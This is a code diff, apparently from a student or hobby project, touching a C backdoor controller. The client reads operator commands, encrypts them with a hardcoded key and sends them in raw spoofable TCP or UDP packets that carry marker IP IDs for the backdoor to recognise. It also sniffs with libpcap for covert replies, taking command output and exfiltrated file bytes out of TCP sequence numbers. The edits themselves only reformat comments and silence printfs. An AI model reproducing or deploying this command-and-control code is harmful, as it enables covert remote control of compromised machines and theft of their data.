@@ -14,14 +14,14 @@ void backdoor_client(uint32 srcip, uint32 destip, char* protocol) {
 	char *cmd;
 	pthread_t pth_id;
 
-	// Can they run this?
+// Can they run this?
 	if (geteuid() != 0) {
 		printf(
 				"\nYou need to be root to run this.\n\nApplication Terminated!\n\n");
 		exit(0);
 	}
 
-	// Check for correct arguments, and provide them with a usage.
+// Check for correct arguments, and provide them with a usage.
 	if ((srcip == 0) && (destip == 0)) {
 		perror("Invalid IP Address");
 	}
@@ -34,27 +34,27 @@ void backdoor_client(uint32 srcip, uint32 destip, char* protocol) {
 
 	pthread_create(&pth_id, NULL, sniffer_thread, NETWORK_CARD);
 
-	cln = client_new(); 			// create and initialize a new client struct
+	cln = client_new(); // create and initialize a new client struct
 
-	// set client structure
+// set client structure
 	cln->source_host = srcip;
 	cln->source_port = CMD_PORT;
 	cln->dest_host = destip;
 	cln->dest_port = 80;
 
-	printf("source ip %u, dest ip: %u \n", srcip, destip);
+	//printf("source ip %u, dest ip: %u \n", srcip, destip);
 
 	/**
 	 * Print out destination host information
 	 */
-	printf("\n\nSending commands to: \n");
-	printf("============================\n\n");
-	printf("Destination	: 	%u:%u\n", cln->dest_host, cln->dest_port);
-	printf("Source		: 	%u:%u\n", cln->source_host, cln->source_port);
+	//printf("\n\nSending commands to: \n");
+	//printf("============================\n\n");
+	//printf("Destination : %u:%u\n", cln->dest_host, cln->dest_port);
+	//printf("Source : %u:%u\n", cln->source_host, cln->source_port);
 
-	printf("\n");
+	//printf("\n");
 
-	// initialize random function
+// initialize random function
 	srand(time(NULL) + getpid());
 
 	cmd = malloc(sizeof(char*));
@@ -64,13 +64,13 @@ void backdoor_client(uint32 srcip, uint32 destip, char* protocol) {
 		fgets(cmd, 4096, stdin);
 		send_packets(cln, cmd, protocol);
 
-		//sniffer_thread((void *)"em1");
+//sniffer_thread((void *)"em1");
 	}
 
 	pthread_join(pth_id, NULL);
 	printf("\nExiting the Controller........\n\n");
 
-	//return EXIT_SUCCESS;
+//return EXIT_SUCCESS;
 }
 
 client *client_new(void) {
@@ -87,7 +87,7 @@ void packet_new(client *c, char *msg, char* protocol) {
 	int randomID = 0;
 
 	if ((strcmp(protocol, "TCP") == 0) || (strcmp(protocol, "tcp") == 0)) {
-		// IP header fields
+// IP header fields
 		packets_tcp.ip.version = 4;
 		packets_tcp.ip.ihl = 5;
 		packets_tcp.ip.tos = 0;
@@ -102,7 +102,7 @@ void packet_new(client *c, char *msg, char* protocol) {
 		packets_tcp.ip.saddr = c->source_host;
 		packets_tcp.ip.daddr = c->dest_host;
 
-		// initial TCP header fields
+// initial TCP header fields
 		packets_tcp.tcp.source = 0;
 		packets_tcp.tcp.dest = 0;
 		packets_tcp.tcp.seq = 0;
@@ -122,8 +122,8 @@ void packet_new(client *c, char *msg, char* protocol) {
 		packets_tcp.tcp.check = 0;
 		packets_tcp.tcp.urg_ptr = 0;
 
-		// Add the data to the datagram
-		// encrypt data
+// Add the data to the datagram
+// encrypt data
 		encrypt(SEKRET, msg, sizeof(msg));
 		strcpy(packets_tcp.data, msg);
 
@@ -133,7 +133,7 @@ void packet_new(client *c, char *msg, char* protocol) {
 
 		packets_tcp.tcp.seq = 1 + (int) (10000.0 * rand() / (RAND_MAX + 1.0));
 
-		// generate random id between 5000 and 5050 used to authenticate backdoor packets
+// generate random id between 5000 and 5050 used to authenticate backdoor packets
 		randomID = randomRange(5000, 5050);
 		packets_tcp.ip.id = htons(randomID);
 
@@ -142,7 +142,7 @@ void packet_new(client *c, char *msg, char* protocol) {
 
 		packets_tcp.ip.check = in_cksum((unsigned short *) &packets_tcp.ip, 20);
 
-		// PSEUDO Header fields
+// PSEUDO Header fields
 		pseudo_header_tcp.source_address = packets_tcp.ip.saddr;
 		pseudo_header_tcp.dest_address = packets_tcp.ip.daddr;
 		pseudo_header_tcp.placeholder = 0;
@@ -171,11 +171,11 @@ void packet_new(client *c, char *msg, char* protocol) {
 		packets_udp.ip.saddr = c->source_host;
 		packets_udp.ip.daddr = c->dest_host;
 
-		//UDP header fields
+//UDP header fields
 		packets_udp.udp.len = 0;
 		packets_udp.udp.check = 0;
 
-		// Add the data to the datagram encrypt data
+// Add the data to the datagram encrypt data
 		encrypt(SEKRET, msg, sizeof(msg));
 		strcpy(packets_udp.data, msg);
 
@@ -183,7 +183,7 @@ void packet_new(client *c, char *msg, char* protocol) {
 
 		packets_udp.udp.dest = htons(c->dest_port);
 
-		// generate random id between 5000 and 5050 used to authenticate backdoor packets
+// generate random id between 5000 and 5050 used to authenticate backdoor packets
 		randomID = randomRange(5000, 5050);
 		packets_udp.ip.id = htons(randomID);
 
@@ -194,13 +194,13 @@ void packet_new(client *c, char *msg, char* protocol) {
 
 		packets_udp.udp.len = htons(sizeof(packets_udp.udp));
 
-		// UDP Pseudo header fields
+// UDP Pseudo header fields
 		pseudo_header_udp.source_address = packets_udp.ip.saddr;
 		pseudo_header_udp.dest_address = packets_udp.ip.daddr;
 		pseudo_header_udp.placeholder = 0;
 		pseudo_header_udp.protocol = IPPROTO_UDP;
 
-		// or size of UDP_HDR_SZ
+// or size of UDP_HDR_SZ
 		pseudo_header_udp.udp_length = htons(packets_udp.udp.len);
 
 		bcopy((char *) &packets_udp.udp, (char *) &pseudo_header_udp.udp, 20);
@@ -302,19 +302,19 @@ pcap_t * open_pcap_socket(char *device, const char *filter) {
 	uint32_t srcip, netmask;
 	struct bpf_program bpf;
 
-	// open the device for live capture
+// open the device for live capture
 	if ((pd = pcap_open_live(device, BUFSIZ, 1, 0, errbuf)) == NULL) {
 		printf("pcap_open_live(): %s\n", errbuf);
 		return NULL;
 	}
 
-	// get network device source IP address and netmask
+// get network device source IP address and netmask
 	if (pcap_lookupnet(device, &srcip, &netmask, errbuf) < 0) {
 		printf("pcap_lookupnet(): %s\n", errbuf);
 		return NULL;
 	}
 
-	// Covert the filter into a packet filter binary
+// Covert the filter into a packet filter binary
 	if (pcap_compile(pd, &bpf, (char *) filter, 0, netmask)) {
 		printf("pcap_compile(): %s\n", pcap_geterr(pd));
 		return NULL;
@@ -352,7 +352,7 @@ void parse_response_packet(u_char *user, struct pcap_pkthdr *packethdr,
 		int sourcePort = ntohs(tcphdr->source);
 
 		if (sourcePort == RSP_PORT) {
-			printf("%c", tcphdr->seq);
+			fprintf(stdout, "%c", tcphdr->seq);
 		} else if (sourcePort == XFL_PORT) {
 			writeToFile(tcphdr->seq);
 		}
